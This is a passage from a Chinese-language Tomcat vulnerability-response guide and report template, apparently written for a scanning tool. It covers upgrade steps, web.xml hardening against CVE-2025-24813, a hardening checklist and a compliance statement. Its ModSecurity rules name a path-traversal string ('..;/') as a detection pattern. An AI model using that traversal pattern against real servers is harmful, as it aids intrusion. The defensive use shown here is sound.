# 5. 迁移配置
cp $CATALINA_HOME/conf.backup.*/server.xml apache-tomcat-9.0.99/conf/
cp $CATALINA_HOME/conf.backup.*/web.xml apache-tomcat-9.0.99/conf/
cp -r $CATALINA_HOME/webapps apache-tomcat-9.0.99/

# 6. 更新环境变量
export CATALINA_HOME=/path/to/apache-tomcat-9.0.99

# 7. 启动Tomcat
$CATALINA_HOME/bin/startup.sh

# 8. 验证版本
$CATALINA_HOME/bin/version.sh
```

#### 2. 临时缓解措施

**方案A: 禁用PUT方法**
```xml
<!-- 在 web.xml 中添加 -->
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Disable PUT</web-resource-name>
        <url-pattern>/*</url-pattern>
        <http-method>PUT</http-method>
        <http-method>DELETE</http-method>
    </web-resource-collection>
    <auth-constraint />
</security-constraint>
```

**方案B: 配置DefaultServlet只读模式**
```xml
<!-- 在 web.xml 中修改 DefaultServlet 配置 -->
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>true</param-value>
    </init-param>
</servlet>
```

**方案C: WAF规则**
```
# ModSecurity规则示例
SecRule REQUEST_METHOD "@streq PUT" \
    "id:1001,phase:2,block,log,msg:'CVE-2025-24813: Blocked PUT request'"

SecRule REQUEST_URI "@contains ..;/" \
    "id:1002,phase:1,deny,status:403,log,msg:'CVE-2025-24813: Path traversal attempt'"
```

#### 3. 配置加固建议

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Tomcat安全配置加固清单                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  □ 禁用不必要的HTTP方法 (PUT, DELETE, TRACE, OPTIONS)               │
│  □ 配置DefaultServlet为只读模式 (readonly=true)                     │
│  □ 删除默认的示例应用 (examples, docs, manager, host-manager)      │
│  □ 修改默认端口和管理路径                                           │
│  □ 启用访问日志并定期审计                                           │
│  □ 配置强密码策略和认证机制                                         │
│  □ 限制管理界面访问IP                                               │
│  □ 启用HTTPS并禁用HTTP                                              │
│  □ 配置安全的JVM参数                                                │
│  □ 定期更新到最新版本                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 四、输出格式规范

### 报告结构模板

```markdown
# 中间件漏洞情报报告

## 1. 执行摘要

### 1.1 扫描概览
| 项目 | 内容 |
|-----|------|
| 扫描时间 | YYYY-MM-DD HH:MM:SS |
| 扫描目标 | [目标范围] |
| 扫描组件 | [组件列表] |
| 时间范围 | [最近N天] |
| 漏洞总数 | [X个] |
| 高危漏洞 | [X个] |
| 中危漏洞 | [X个] |
| 低危漏洞 | [X个] |

### 1.2 关键发现
- 🔴 [关键发现1]
- 🟠 [关键发现2]
- 🟡 [关键发现3]

### 1.3 优先行动项
1. [P0] [紧急行动项] - 24小时内完成
2. [P1] [重要行动项] - 7天内完成
3. [P2] [一般行动项] - 30天内完成

---

## 2. 漏洞清单

| 序号 | CVE编号 | 组件 | 版本 | CVSS | EPSS | CISA KEV | 状态 | 优先级 |
|-----|---------|------|------|------|------|----------|------|--------|
| 1 | CVE-YYYY-XXXXX | [组件] | [版本] | [分数] | [分数] | [是/否] | [状态] | [P0/P1/P2] |

---

## 3. 详细漏洞分析

### 3.1 CVE-YYYY-XXXXX

#### 基本信息
| 字段 | 内容 |
|-----|------|
| CVE编号 | CVE-YYYY-XXXXX |
| 漏洞名称 | [名称] |
| 影响组件 | [组件] |
| 影响版本 | [版本范围] |
| CVSS v3.1 | [分数] ([等级]) |
| EPSS评分 | [分数] |
| CISA KEV | [是/否] |
| 漏洞类型 | [类型] |
| 利用条件 | [条件] |
| 修复版本 | [版本] |

#### 漏洞描述
[详细描述]

#### 影响评估
[影响分析]

#### 检测方案
\`\`\`[语言]
[检测代码]
\`\`\`

#### 修复建议
[修复方案]

---

## 4. 检测方案汇总

### 4.1 Nuclei模板
[模板列表]

### 4.2 Sigma规则
[规则列表]

### 4.3 Yara规则
[规则列表]

### 4.4 扫描命令
[命令列表]

---

## 5. 修复优先级矩阵

```
          利用难度
          低      高
        ┌────────┬────────┐
  高    │  P0    │  P1    │
影响    │ 立即修复│ 优先修复│
程度    ├────────┼────────┤
  低    │  P1    │  P2    │
        │ 优先修复│ 计划修复│
        └────────┴────────┘
```

| 优先级 | CVE数量 | 修复时限 | 行动建议 |
|--------|---------|---------|---------|
| P0 | [X] | 24小时 | 立即升级/打补丁 |
| P1 | [X] | 7天 | 安排修复计划 |
| P2 | [X] | 30天 | 纳入常规维护 |

---

## 6. 附录

### 6.1 参考链接
- [CVE详情]
- [厂商公告]
- [技术文章]

### 6.2 工具命令
[命令参考]

### 6.3 术语表
[术语解释]

---

报告生成时间: YYYY-MM-DD HH:MM:SS  
报告版本: v1.0  
机密级别: [内部/机密/公开]
```

---

## 五、合规声明确认

**使用本工具即表示您已阅读并同意以下条款：**

1. ✅ 仅在获得书面授权的情况下使用本工具
2. ✅ 遵守所有适用的法律法规
3. ✅ 对测试结果和发现的漏洞保密
4. ✅ 遵循负责任的漏洞披露原则
5. ✅ 承担因违规使用导致的所有法律责任

---

*文档版本: 1.0*  
*最后更新: 2025-01-20*  
*维护团队: Security Compliance Team*
